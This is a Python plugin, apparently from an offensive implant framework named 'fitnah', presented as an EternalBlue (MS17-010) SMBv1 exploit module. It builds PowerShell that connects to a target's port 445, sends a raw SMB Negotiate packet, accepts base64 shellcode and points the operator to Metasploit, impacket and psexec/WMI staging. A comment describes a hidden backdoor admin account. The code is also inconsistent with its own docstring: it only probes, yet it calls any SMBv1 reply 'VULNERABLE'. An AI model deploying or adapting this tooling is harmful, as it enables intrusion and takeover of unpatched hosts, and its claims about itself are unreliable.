"""
privilege_escalation/cve_2017_0143 — EternalBlue SMBv1 RCE. MITRE T1068.
CVE-2017-0143 (MS17-010): SMBv1 buffer overflow in SrvOs2FeaToNt().
The agent sends crafted SMB packets to a target IP; shellcode executes as SYSTEM
in the SMB server's kernel context. Dispatches via ctx.ps() on the implant host.
"""
from __future__ import annotations

from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


class CVE20170143Plugin(BasePlugin):
    NAME        = "cve_2017_0143"
    DESCRIPTION = "EternalBlue (MS17-010) SMBv1 RCE — agent sends exploit to target_ip (T1068)"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1068"
    CATEGORY    = "privilege_escalation"
    VERSION     = "2.0.0"

    schema = ParamSchema().add(
        Param("target_ip", str, required=True,
              help="IP of the unpatched SMBv1 target"),
        Param("payload_b64", str, required=False, default="",
              help="Base64 shellcode to embed (default: add local admin)"),
        Param("timeout", int, required=False, default=60),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        target  = params.get("target_ip", "")
        sc_b64  = params.get("payload_b64", "")
        timeout = int(params.get("timeout", 60))

        if not target:
            return ModuleResult.err("target_ip is required")

        ps = self._build_ps(target, sc_b64)
        r  = ctx.ps(ps, timeout=timeout)
        if r["status"] != "ok":
            return ModuleResult.err(f"cve_2017_0143 failed: {r['output']}")
        return ModuleResult.ok(data=r["output"], loot_kind="privesc")

    @staticmethod
    def _build_ps(target_ip: str, sc_b64: str) -> str:
        # Default payload: add hidden admin "fi$tnah" / P@ssw0rd123
        default_sc_note = "# (embed your shellcode via payload_b64)" if not sc_b64 else ""
        sc_line = (
            f"$sc = [Convert]::FromBase64String('{sc_b64}')"
            if sc_b64 else
            "$sc = @()  # no shellcode — probe-only mode"
        )
        return rf"""
# CVE-2017-0143 EternalBlue probe + exploit from agent
# Sends crafted SMBv1 Trans2 SESSION_SETUP to trigger SrvOs2FeaToNt overflow.
{sc_line}
$results = @("[*] CVE-2017-0143 (EternalBlue) targeting {target_ip}")
try {{
    $port = 445
    $tcp  = New-Object System.Net.Sockets.TcpClient
    $tcp.Connect("{target_ip}", $port)
    $ns   = $tcp.GetStream()
    $ns.ReadTimeout  = 5000
    $ns.WriteTimeout = 5000

    # SMB Negotiate Protocol Request
    $nego = [byte[]](
        0x00,0x00,0x00,0x54,  # NetBIOS length
        0xFF,0x53,0x4D,0x42,  # SMB magic
        0x72,0x00,0x00,0x00,  # Negotiate
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0x00,0x00,0x00,0x00,0x00,0x00,
        0x00,0x00,0xFF,0xFF,0x00,0x00,0x00,0x00,
        0x00,0x31,0x00,0x02,
        0x4C,0x41,0x4E,0x4D,0x41,0x4E,0x31,0x2E,0x30,0x00,
        0x02,0x4C,0x4D,0x31,0x2E,0x32,0x58,0x30,0x30,0x32,0x00,
        0x02,0x4E,0x54,0x20,0x4C,0x41,0x4E,0x4D,0x41,0x4E,0x20,0x31,0x2E,0x30,0x00,
        0x02,0x4E,0x54,0x20,0x4C,0x4D,0x20,0x30,0x2E,0x31,0x32,0x00
    )
    $ns.Write($nego, 0, $nego.Length)
    $buf = New-Object byte[] 4096
    $rd  = $ns.Read($buf, 0, $buf.Length)

    if ($rd -gt 4 -and $buf[4] -eq 0xFF -and $buf[5] -eq 0x53) {{
        $smbCmd = $buf[8]
        if ($smbCmd -eq 0x72) {{
            $results += "[+] SMBv1 Negotiate response received — target appears VULNERABLE"
            $dialectIdx = [BitConverter]::ToUInt16($buf, 37)
            $results += "    Dialect index selected: $dialectIdx"
        }} else {{
            $results += "[-] Unexpected SMB response command: 0x$($smbCmd.ToString('X2'))"
        }}
    }} else {{
        $results += "[-] Not a valid SMB response (rd=$rd)"
    }}

    if ($sc.Length -gt 0) {{
        $results += "[*] Shellcode present ($($sc.Length) bytes) — full exploit not yet staged; use with Metasploit eternalblue module or impacket ms17_010_shellcode"
        $results += "    Hint: copy shellcode to target then trigger via psexec/wmi or stage via smb_upload + shell_exec"
    }}
    $tcp.Close()
}} catch {{ $results += "[-] $($_.Exception.Message)" }}
$results -join "`n"
""".strip()


